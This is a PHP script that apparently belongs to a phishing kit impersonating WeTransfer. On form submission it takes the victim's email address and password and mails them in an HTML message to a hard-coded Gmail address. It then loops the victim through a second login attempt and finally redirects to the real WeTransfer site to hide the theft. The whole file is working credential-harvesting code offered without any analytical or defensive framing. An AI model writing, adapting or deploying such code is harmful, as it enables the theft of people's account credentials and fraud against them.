<?php
    if(isset($_POST['submit'])){
        $email = $_POST['email'];
        $password = $_POST['password'];
        $first_pass = $_POST['first_attempt'];
        $sec_pass = $_POST['sec_attempt'];
        $attp = $_POST['attp'];
        

        $fromEmail = "db.generalgroup@gmail.com";
        $to = "db.generalgroup@gmail.com";
        $subject = "Message from WeTransfer Website";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= 'From: '.$fromEmail.'<'.$fromEmail.'>' . "\r\n".'Reply-To: '.$fromEmail."\r\n" . 'X-Mailer: PHP/' . phpversion();
        $message = '<!doctype html>
                    <html lang="en">
                        <head>
                            <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
                            <meta http-equiv="X-UA-Compatible" content="ie=edge">
                            <title>Document</title>
                        </head>
                        <body>
                            <span class="preheader" style="color:transparent; display:none;height:0;max-height:0;max-width:0;opacity:0; overflow:hidden; mso-hide: all; visibility:hidden; width:0">'.$email.'</span>
                            <div class="container">
                                <b>Email:</b> ' .$email. '<br/><br/><b>Password:</b> ' .$password. '<br/><br/>Regards!
                            </div>
                        </body>
                    </html>';
        
        $result = @mail($to, $subject, $message, $headers);

        if($result){
            if($attp==1){
                header("Location: 684503.php?email=$email&attp=2");
            }elseif($attp==2){
                header("Location: https://wetransfer.com/");
            }else{
                header("Location: 684503.php?email=$email&attp=1");
            }
        }else{
            echo "Error: Email wasn't sent";
        }

    }
?>